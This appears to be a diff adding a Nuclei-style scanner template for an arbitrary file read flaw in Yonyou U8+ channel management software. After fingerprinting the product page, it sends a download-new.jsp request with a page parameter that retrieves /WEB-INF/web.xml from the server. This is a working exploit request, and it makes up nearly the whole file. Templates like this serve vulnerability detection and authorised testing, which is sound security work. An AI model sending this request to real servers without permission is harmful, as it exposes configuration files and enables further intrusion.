@@ -1,0 +1,46 @@
+id: poc-yaml-yongyon-u8-cm-ae-download-new-anyfile-read
+info:
+  name: 用友U8+渠道管理(高级版) download-new 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /indexbusiness.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "渠道管理（高级版）"
+
+  - raw:
+      - |
+        GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<servlet-name>"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
